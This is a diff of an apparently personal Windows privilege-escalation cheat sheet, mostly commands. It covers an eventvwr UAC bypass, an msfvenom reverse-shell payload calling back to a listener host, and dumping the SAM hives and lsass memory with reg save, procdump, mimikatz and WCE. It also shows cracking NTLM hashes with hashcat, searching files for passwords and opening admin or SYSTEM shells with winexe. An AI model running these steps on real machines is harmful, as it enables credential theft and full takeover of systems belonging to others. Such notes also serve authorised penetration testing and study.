@@ -12,7 +12,6 @@ Basics:
 				LM Hash:DES Encryption
 	Windows Vault:(Credential Manager)	
 		stores credentials using which Windows log in the users automatically, which means that any Windows application that needs credentials to access a resource can make use of CWindows Vault and use the credentials supplied instead of users entering the username and password all the time.
-	UAC: see UAC Bypass sheet
 	PowerShell: See PowerShell For Pentesting
 	CommandPrompt: See CommandPrompt For Pentesting	
 	ACL:(Acess Control List)
@@ -624,6 +623,7 @@ UAC Bypass:
 			Usage:
 				wget https://raw.githubusercontent.com/turbo/zero2hero/master/main.c
 				edit main.c:
+					remove comments
 					change line "strcat(curPath, "\\foobar.exe");" to "strcat(curPath, "\\revshell.exe");"
 			 	x86_64-w64-mingw32-gcc main.c -o eventvwr-bypassuac-64.exe
 			 	msfvenom -a x64 --platform Windows -p windows/x64/shell_reverse_tcp LHOST=172.50.50.50 LPORT=3333 -f exe -o revshell.exe
@@ -663,7 +663,7 @@ UAC Bypass:
 	Bypassing UAC via DLL Hijacking:
 		Here, we find a process/application that has "autoelevate" and then do DLL Hijacking for that process
 	What is "Run as Administrator"
-Credentials mining:
+Credentials mining:(important part in privesc)
 	Dumping Sam file:
 		dumping windows hashes using registery hives:
 			C:\> mkdir temp
@@ -672,29 +672,34 @@ Credentials mining:
 			C:\> reg.exe save hklm\system c:\temp\system.save
 			tranfer these using smbserver
 			secretsdump.py -sam sam.save -security security.save -system system.save LOCAL => gives ntlm hashes
-		mimikitaz:
-			C:\>~mimikitaz.exe
-			mimikitaz#privilege::debug
-			mimikitaz#token::elevate
-			mimikitaz#lsadump::sam => dump SAM
+				Full guide of secretsdump.py is in Active Directory sheet
+		mimikatz.exe: Shown below
 		meterpreter:
 			hashdump
-	Using SAM and system to grab hashes:
-		secretsdump.py -sam SAM -system SYSTEM local => gives ntlm hashes
-			Full guide of secretsdump.py is in Active Directory sheet
 		samdump2 SYSTEM SAM
 	Cracking ntlm hashes:
 		https://samsclass.info/123/proj10/px16-hashcat-win.htm
 		hashcat -m 1000 -a 0 -o out.txt hashes.txt wordlist.txt
 	Memory Password mining:	
-		"Procdump" (sysinternals tool) is used to dump processes in memory, Services like FTP have credentials in clear text in memory.So, we can dump memory and read the credentials.
-		NOTE: we need to transfer procdump.exe to vicitim firstly.
-		procdump.exe -accepteula -ma lsass.exe lsass.dmp
-		then copy dump file to local windows machine of same arch
-		cmd> mimikatz.exe
-			sekurlsa::minidump c:\users\whoami\desktop\lsass.dmp
-	Password hunting:
-		Automated:
+		Procdump.exe:(sysinternals tool)
+			Its used to dump processes in memory, Services like FTP have credentials in clear text in memory.So, we can dump memory and read the credentials.
+			procdump.exe -accepteula -ma lsass.exe lsass.dmp
+			copy dump file to local windows machine of same arch
+		mimikatz.exe: Shown below
+	Grabbing Clear Text Passwords From Memory:
+		Note:
+			winpeas do it automatically 
+		WCE:(Windows Credential Editor)
+			It allows to list windows logon sessions and add/delete/change/list associated crentials(LM/NT hash,kerbros tickets, passwords)
+			wce -l => list logon sessions and hashes
+			wce -w => to dump clear text passwords
+			issue:
+				can easily invoke antivirus/windows_defender
+		mimikatz: Shown below
+		Note:
+			we need admin privileges to run both WCE and mimikatz
+	Password hunting from strings:
+		Note:
 			winpeas do it automatically 
 		Manual:
 			findstr /si password *.txt *.ini *.config
@@ -708,15 +713,22 @@ Credentials mining:
 					reg query HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys
 					once found, they can be decrypted using::
 						https://github.com/ropnop/windows_sshagent_extract
-	Msfconsole:
-		post/windows/gather/credentials/*
-		post/windows/gather/enum_unattend
+	mimikatz:
+		C:\>mimikatz.exe
+				privilege::debug
+				token::elevate
+				lsadump::sam => dump SAM
+				sekurlsa::minidump c:\users\whoami\desktop\lsass.dmp => dump lsass
+				sekurlsa::logonPasswords full => Grabbing Clear Text Passwords From Memory
+		Note:
+			mimikatz is arch-dependent and has two versions available, x86 and x64.
+		Note:
+			we need privileges to run mimikatz
 	Once we get the creds:
 		If we have hash:
 			pass-the-hash => Read in "Active Directory"
 		If we have cleartext creds:
 			winexe:
-				winexe -U 'username%pass' //ip cmd.exe
 				winexe -U 'admin%pass' //ip cmd.exe => gives admin shell
 				winexe -U 'admin%pass' --system //ip cmd.exe => gives system shell
 Nishang:
